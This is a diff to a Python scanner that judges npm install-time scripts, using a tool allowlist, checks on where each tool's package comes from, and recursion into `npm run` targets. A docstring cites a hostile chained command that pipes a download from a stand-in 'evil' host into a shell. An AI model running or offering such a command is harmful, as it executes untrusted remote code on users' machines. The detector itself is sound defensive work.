@@ -168,6 +168,80 @@ needs no review, so the list stays small enough to read.
 """
 
 
+SAFE_TOOLS: dict[str, str] = {
+    # Measured in the 200K corpus (review 98, FP-1): the hook commands of 5,744 npm packages,
+    # ranked by frequency and each reviewed once. Command prefix -> the npm package that provides
+    # the command, which must not be declared from anywhere but the registry (`GENUINE_SPEC`).
+    "only-allow": "only-allow",
+    "npx only-allow": "only-allow",
+    "nuxt prepare": "nuxt",
+    "nuxi prepare": "nuxi",
+    "npx nuxi prepare": "nuxi",
+    "svelte-kit sync": "@sveltejs/kit",
+    "ngcc": "@angular/compiler-cli",
+    "prisma generate": "prisma",
+    "npx prisma generate": "prisma",
+    "bower install": "bower",
+    "lerna bootstrap": "lerna",
+    "electron-rebuild": "electron-rebuild",
+    "opencollective-postinstall": "opencollective-postinstall",
+    "simple-git-hooks": "simple-git-hooks",
+    "npx simple-git-hooks": "simple-git-hooks",
+    "npx husky install": "husky",
+    "npx husky": "husky",
+    "husky install": "husky",
+    "husky": "husky",
+    "playwright install": "playwright",
+    "npx playwright install": "playwright",
+    "typings install": "typings",
+    "npx npm-force-resolutions": "npm-force-resolutions",
+    "npx force-resolutions": "force-resolutions",
+    "patch-package": "patch-package",
+    "prebuild-install": "prebuild-install",
+    "node-pre-gyp": "@mapbox/node-pre-gyp",
+    "node-gyp-build": "node-gyp-build",
+    "cmake-js": "cmake-js",
+    "opencollective": "opencollective",
+    "is-ci": "is-ci",
+}
+"""Third-party tools a lifecycle script may run, by the package that provides each. An attacker can
+name a command after one, so it counts only when that package is not declared from a git
+repository, a URL, a local path or under an `npm:` alias (`08` P1)."""
+
+NPM_BUILTINS = ("npm rebuild", "npm prune")
+"""npm's own commands that re-link or rebuild what is already installed."""
+
+GENUINE_SPEC = re.compile(
+    r"^\s*(?:npm:|git[+:]|https?:|file:|link:|github:|gitlab:|bitbucket:|[\w.-]+/[\w.-]+(?:#|$))"
+)
+"""A dependency spec that is not the registry: what makes a safe tool's name a costume."""
+
+CONTROL = re.compile(r"(?:exit(?:\s+\d{1,3})?|true|:)")
+"""Shell words that do nothing but end or succeed: `echo "use pnpm" && exit 1` is a guard."""
+
+CD_INSIDE = re.compile(r"cd\s+(?![/~$\\])(?!.*\.\.)[\w./@-]{1,200}")
+"""A change of directory inside the package: what the command after it runs still decides."""
+
+RUN_SCRIPT = re.compile(
+    r"(?:npm\s+run(?:-script)?|pnpm\s+run|yarn\s+run|yarn|pnpm)\s+(?P<name>[\w:.-]{1,80})(?:\s+--.*)?"
+)
+"""`npm run build`: another script in the same manifest, judged by what IT runs."""
+
+ASSIGNED_NAME = re.compile(r"[A-Za-z_]\w{0,60}=")
+"""A leading `VAR=value` (or after `env`); stripped only when its value runs nothing."""
+
+LOCAL_BIN = re.compile(r"^(?:\./)?node_modules/\.bin/")
+"""`./node_modules/.bin/bower install` is `bower install`, as npm puts that directory on PATH."""
+
+NPX_FLAGS = frozenset({"--yes", "-y", "--no-install"})
+"""Flags npx takes before the tool it runs."""
+
+OWN_MODULE = re.compile(r"node_modules/[\w@./*-]{1,200}")
+"""A path inside the package's own `node_modules`."""
+
+NOT_SCRIPTS = frozenset({"install", "add", "i", "ci", "remove", "upgrade", "update", "dlx", "exec"})
+"""Package-manager verbs that are not a script name after `yarn` or `pnpm`."""
+
 #: Directories whose manifests belong to somebody else.
 #:
 #: The distinction this rule was missing, and the reason it was calibrated for one
@@ -310,22 +384,117 @@ class ManifestScripts:
         return True
 
     @staticmethod
-    def _is_safe_lifecycle(command: str) -> bool:
+    def _is_safe_lifecycle(
+        command: str,
+        scripts: dict[str, str] | None = None,
+        declared: dict[str, str] | None = None,
+        depth: int = 0,
+    ) -> bool:
         """Whether a lifecycle command is a recognised build step.
 
         Compared against the whole command after stripping shell chaining, so
         `node-gyp rebuild && curl evil | sh` is not waved through by its first
         clause -- which is how an allowlist that matched a prefix of the raw string
-        would have been defeated in one move.
+        would have been defeated in one move. `npm run X` is judged by what script `X` runs,
+        three levels deep at most; a tool is judged by where its package comes from.
         """
         parts = [p.strip() for p in re.split(r"&&|\|\||;|\||\n", command) if p.strip()]
         if not parts:
             return False
         return all(
-            any(part == safe or part.startswith(f"{safe} ") for safe in SAFE_LIFECYCLE_PREFIXES)
-            or ManifestScripts._only_prints(part)
-            for part in parts
+            ManifestScripts._safe_part(part, scripts or {}, declared or {}, depth) for part in parts
         )
+
+    @staticmethod
+    def _safe_part(
+        part: str, scripts: dict[str, str], declared: dict[str, str], depth: int
+    ) -> bool:
+        # The same command, spelled the ways packages spell it: behind variable assignments
+        # (`env PKG_CONFIG_PATH=./x node-gyp rebuild`), through the local bin directory, or by
+        # npx. An assignment whose value runs something (`X=$(curl ...)`) is not stripped.
+        stripped = LOCAL_BIN.sub("", ManifestScripts._without_assignments(part), count=1)
+        if stripped != part:
+            return bool(stripped) and ManifestScripts._safe_part(stripped, scripts, declared, depth)
+        tokens = part.split()
+        if tokens and tokens[0] == "npx":
+            rest = " ".join(t for t in tokens[1:] if t not in NPX_FLAGS)
+            if any(rest == t or rest.startswith(f"{t} ") for t in SAFE_TOOLS):
+                return ManifestScripts._safe_part(rest, scripts, declared, depth)
+        if (
+            len(tokens) >= 3
+            and tokens[0] == "rm"
+            and re.fullmatch(r"-[rfvR]{1,4}", tokens[1])
+            and all(OWN_MODULE.fullmatch(t) and ".." not in t for t in tokens[2:])
+        ):
+            # Removing something from the package's own `node_modules`: the stubs packages prune.
+            return True
+        if any(part == safe or part.startswith(f"{safe} ") for safe in SAFE_LIFECYCLE_PREFIXES):
+            tool = SAFE_TOOLS.get(
+                next(
+                    (
+                        t
+                        for t in sorted(SAFE_TOOLS, key=len, reverse=True)
+                        if part == t or part.startswith(f"{t} ")
+                    ),
+                    "",
+                ),
+            )
+            return tool is None or not GENUINE_SPEC.match(declared.get(tool, ""))
+        for prefix, package in sorted(SAFE_TOOLS.items(), key=lambda kv: -len(kv[0])):
+            if part == prefix or part.startswith(f"{prefix} "):
+                return not GENUINE_SPEC.match(declared.get(package, ""))
+        if any(part == b or part.startswith(f"{b} ") for b in NPM_BUILTINS):
+            return True
+        if (
+            CONTROL.fullmatch(part)
+            or CD_INSIDE.fullmatch(part)
+            or ManifestScripts._only_prints(part)
+        ):
+            return True
+        run = RUN_SCRIPT.fullmatch(part)
+        if run and run.group("name") not in NOT_SCRIPTS and depth < 3:
+            target = scripts.get(run.group("name"))
+            return target is not None and ManifestScripts._is_safe_lifecycle(
+                target, scripts, declared, depth + 1
+            )
+        return False
+
+    @staticmethod
+    def _without_assignments(part: str) -> str:
+        """`part` without leading `VAR=value` words (or `env` and them) whose values run nothing:
+        `env PKG_CONFIG_PATH=./x node-gyp rebuild` is `node-gyp rebuild`; `X=$(curl ..) y` stays."""
+        tokens = part.split()
+        index = 1 if tokens and tokens[0] == "env" else 0
+        start = index
+        while index < len(tokens) and ASSIGNED_NAME.match(tokens[index]):
+            if "$(" in tokens[index] or "`" in tokens[index]:
+                return part
+            index += 1
+        return " ".join(tokens[index:]) if index > start else part
+
+    @staticmethod
+    def npm_scripts(unit: FileUnit) -> tuple[dict[str, str], dict[str, str]]:
+        """A package.json's scripts, and every dependency it declares with its spec."""
+        import json
+
+        try:
+            data = json.loads(unit.content.text)
+        except ValueError:
+            return {}, {}
+        if not isinstance(data, dict):
+            return {}, {}
+        scripts = {k: v for k, v in (data.get("scripts") or {}).items() if isinstance(v, str)}
+        declared: dict[str, str] = {}
+        for field in (
+            "dependencies",
+            "devDependencies",
+            "optionalDependencies",
+            "peerDependencies",
+        ):
+            section = data.get(field)
+            if isinstance(section, dict):
+                declared.update({k: v for k, v in section.items() if isinstance(v, str)})
+        return scripts, declared
 
     @staticmethod
     def _only_prints(part: str) -> bool:
@@ -670,6 +839,17 @@ class ManifestDetector(BaseDetector):
                 remediation="Do not install it.",
             ),
             DeclaredRule(
+                id="SUSPECT.ARCHIVE.PADDED.001",
+                title="Archive padded past the scan's budget",
+                severity=Severity.HIGH,
+                confidence=Confidence.MEDIUM,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message="The archive expands far past its compression ceiling and the byte budget ran out inside it, so what follows the padding was not read.",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Do not install it until it is examined whole.",
+            ),
+            DeclaredRule(
                 id="SUSPECT.ARCHIVE.NESTING.001",
                 title="Archives nested past the depth the scan opens",
                 severity=Severity.HIGH,
@@ -866,8 +1046,11 @@ class ManifestDetector(BaseDetector):
             rf"{re.escape(name).replace('-', '[-_.]')}-\d[\w.+!-]{{0,40}}",
             directory.lower().replace("_", "-"),
         )
+        # Only the formats this was measured on. Raised for every published format, it blocked
+        # plyr, tsibble, pyaml, pytest, istio and the homebrew-core and vcpkg Go snapshots (17 of
+        # 34,500 real packages, review 98): there the matched manifest is often not the package's.
         published = (
-            ctx.package_distribution
+            ctx.distribution in ("pypi", "npm")
             or sdist_root is not None
             or unit.path.rpartition("!")[2] == "package/package.json"
         )
@@ -907,6 +1090,9 @@ class ManifestDetector(BaseDetector):
             # machine. 471 of 1,943 popular extensions were blocked for scripts that cannot run.
             # What the extension's code does is read by the code detectors, with its severity.
             return
+        scripts, declared = (
+            ManifestScripts.npm_scripts(unit) if manifest.ecosystem == "npm" else ({}, {})
+        )
         for hook in manifest.hooks:
             command = hook.command
             if not command:
@@ -940,7 +1126,9 @@ class ManifestDetector(BaseDetector):
             # Case-insensitively, because npm spells one of them `prepublishOnly`.
             install_time = hook.name.lower() in INSTALL_TIME_HOOKS
             if not capabilities:
-                if not install_time or ManifestScripts._is_safe_lifecycle(command):
+                if not install_time or ManifestScripts._is_safe_lifecycle(
+                    command, scripts, declared
+                ):
                     continue
                 # An install-time script that is not a recognised build step.
                 # Reported for existing, rather than for containing a word from
